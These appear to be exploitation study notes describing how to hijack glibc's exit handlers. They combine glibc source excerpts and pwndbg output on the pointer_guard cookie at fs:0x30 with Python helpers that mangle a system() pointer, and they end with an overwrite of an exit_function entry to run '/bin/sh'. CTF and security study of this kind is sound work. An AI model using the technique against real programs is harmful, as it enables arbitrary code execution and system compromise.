- `exit()`:
	```C
	void
	exit (int status)                       // BECAREFUL, it's "exit", not "_exit"
	{
	  __run_exit_handlers (status, &__exit_funcs, true, true);
	}
	```
- `__run_exit_handlers()`:
	```C
	void
	attribute_hidden
	__run_exit_handlers (int status, struct exit_function_list **listp,
			     bool run_list_atexit, bool run_dtors)
	{
	  /* First, call the TLS destructors.  */
		...
	      while (cur->idx > 0)
		{
		  struct exit_function *const f = &cur->fns[--cur->idx];
		  const uint64_t new_exitfn_called = __new_exitfn_called;
	
		  switch (f->flavor)
		    {
		      void (*atfct) (void);
		      void (*onfct) (int status, void *arg);
		      void (*cxafct) (void *arg, int status);
		      void *arg;
	
		    case ef_free:
		    case ef_us:
		    ...
		    case ef_cxa:                                      // WHAT WE CARE FOR
		      /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
			 we must mark this function as ef_free.  */
		      f->flavor = ef_free;
		      cxafct = f->func.cxa.fn;
		      arg = f->func.cxa.arg;
	#ifdef PTR_DEMANGLE
		      PTR_DEMANGLE (cxafct);
	#endif
		      /* Unlock the list while we call a foreign function.  */
		      __libc_lock_unlock (__exit_funcs_lock);
		      cxafct (arg, status);                           // TRIGGER
		      __libc_lock_lock (__exit_funcs_lock);
		      break;
		    }
			...
	  if (run_list_atexit)
	    RUN_HOOK (__libc_atexit, ());
	
	  _exit (status);
	}
	```
- source code:
	```C
	# define PTR_MANGLE(var) \
	  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard_local)
	
	enum
	{
	  ef_free,	/* `ef_free' MUST be zero!  */
	  ef_us,
	  ef_on,
	  ef_at,
	  ef_cxa
	};
	
	struct exit_function
	  {
	    /* `flavour' should be of type of the `enum' above but since we need
	       this element in an atomic operation we have to use `long int'.  */
	    long int flavor;
	    union
	      {
		void (*at) (void);
		struct
		  {
		    void (*fn) (int status, void *arg);
		    void *arg;
		  } on;
		struct
		  {
		    void (*fn) (void *arg, int status);
		    void *arg;
		    void *dso_handle;
		  } cxa;
	      } func;
	  };
	  
	struct exit_function_list
	  {
		struct exit_function_list *next;
		size_t idx;
		struct exit_function fns[32];
	  };
	  
	typedef struct
	{
	  void *tcb;		/* Pointer to the TCB.  Not necessarily the
				   thread descriptor used by libpthread.  */
	  dtv_t *dtv;
	  void *self;		/* Pointer to the thread descriptor.  */
	  int multiple_threads;
	  int gscope_flag;
	  uintptr_t sysinfo;
	  uintptr_t stack_guard;
	  uintptr_t pointer_guard;
	  unsigned long int unused_vgetcpu_cache[2];
	  /* Bit 0: X86_FEATURE_1_IBT.
	     Bit 1: X86_FEATURE_1_SHSTK.
	   */
	  unsigned int feature_1;
	  int __glibc_unused1;
	  /* Reservation of some values for the TM ABI.  */
	  void *__private_tm[4];
	  /* GCC split stack support.  */
	  void *__private_ss;
	  /* The marker for the current shadow stack.  */
	  unsigned long long int ssp_base;
	  /* Must be kept even if it is no longer used by glibc since programs,
	     like AddressSanitizer, depend on the size of tcbhead_t.  */
	  __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));
	
	  void *__padding[8];
	} tcbhead_t;
	```
- debug
	```D
	pwndbg> tls
	Thread Local Storage (TLS) base: 0x7ffff7fb8740
	TLS is located at:
	    0x7ffff7fb8000     0x7ffff7fbd000 rw-p     5000       0 [anon_7ffff7fb8]
	Dumping the address:
	00:0000│ fs_base 0x7ffff7fb8740 ◂— 0x7ffff7fb8740
	01:0008│         0x7ffff7fb8748 —▸ 0x7ffff7fb9160 ◂— 1
	02:0010│         0x7ffff7fb8750 —▸ 0x7ffff7fb8740 ◂— 0x7ffff7fb8740
	03:0018│         0x7ffff7fb8758 ◂— 0
	04:0020│         0x7ffff7fb8760 ◂— 0
	05:0028│         0x7ffff7fb8768 ◂— 0xb9ff7764e3030600
	06:0030│         0x7ffff7fb8770 ◂— 0x4a998405fa061d7e
	07:0038│         0x7ffff7fb8778 ◂— 0
	... ↓            2 skipped
	pwndbg> x/10gx $fs_base
	0x7ffff7fb8740: 0x00007ffff7fb8740      0x00007ffff7fb9160
	0x7ffff7fb8750: 0x00007ffff7fb8740      0x0000000000000000
	0x7ffff7fb8760: 0x0000000000000000      0xb9ff7764e3030600
	0x7ffff7fb8770: 0x4a998405fa061d7e      0x0000000000000000
	0x7ffff7fb8780: 0x0000000000000000      0x0000000000000000
	pwndbg> p *(tcbhead_t *)$fs_base
	
	pwndbg> got -r
	[0x403fe8] exit@GLIBC_2.2.5 -> 0x7ffff7e0aec0 (exit) ◂— push rax
	pwndbg> x/10i 0x7ffff7e0aec0
    0x7ffff7e0aec0 <exit>:       push   rax
    0x7ffff7e0aec1 <exit+1>:     pop    rax
    0x7ffff7e0aec2 <exit+2>:     mov    ecx,0x1
    0x7ffff7e0aec7 <exit+7>:     mov    edx,0x1
    0x7ffff7e0aecc <exit+12>:    lea    rsi,[rip+0x1a47ad]        # 0x7ffff7faf680
    0x7ffff7e0aed3 <exit+19>:    sub    rsp,0x8
    0x7ffff7e0aed7 <exit+23>:    call   0x7ffff7e0ac30
    pwndbg> x/xg 0x7ffff7faf680                                   # &__exit_funcs
	0x7ffff7faf680: 0x00007ffff7fb0fe0                            # __exit_funcs
	pwndbg> x/10xg 0x00007ffff7fb0fe0
	0x7ffff7fb0fe0: 0x0000000000000000                0x0000000000000001
	0x7ffff7fb0ff0: 0x0000000000000004 # <- flavor    0xbd31a35a0cc3027d    # <- func.cxa.fn
	0x7ffff7fb1000: 0x0000000000000000                                      # <- func.cxa.arg   
	```
- leak `pointer_guard` cookie at `fs:[0x30]` **OR** arb write this cookie to another value (`0`, for eg)
- disassemble of `PTR_DEMANGLE()`:
```asm
   0x7ffff7e0acf6:      mov    r13,rdx
   0x7ffff7e0acf9:      xor    edx,edx
   0x7ffff7e0acfb:      ror    r13,0x11
   0x7ffff7e0acff:      xor    r13,QWORD PTR fs:0x30        # PTR_DEDEMANGLE (cxafct);
   0x7ffff7e0ad08:      xchg   DWORD PTR [rbx],edx
   0x7ffff7e0ad0a:      cmp    edx,0x1
   0x7ffff7e0ad0d:      jg     0x7ffff7e0ae60
   0x7ffff7e0ad13:      mov    edi,ebp
   0x7ffff7e0ad15:      call   r13                          # cxafct (arg, status);
```
- encrypt `system` addr with cookie:
```python
# rorate bit to right 64-bit
def ror64(x, n):
	return ((x >> n) | (x << (64 - n))) & ((1 << 64) - 1)

# rorate bit to left 64-bit
def rol64(x, n):
	return ((x << n) | (x >> (64 - n))) & ((1 << 64) - 1)

# decrypt (PTR_DEMANGLE)
def decrypt(ptr_enc, cookie):
	return ror64(ptr_enc, 0x11) ^ cookie

# encrypt (PTR_MANGLE)
def encrypt(ptr, cookie):
	return rol64(ptr ^ cookie, 0x11)
``` 
- overwrite `exit_function` struct:
```python
f->flavor = 4
f->func.cxa.fn = p64(mangled_system)
f->func.cxa.args = b"/bin/sh\x00"
```
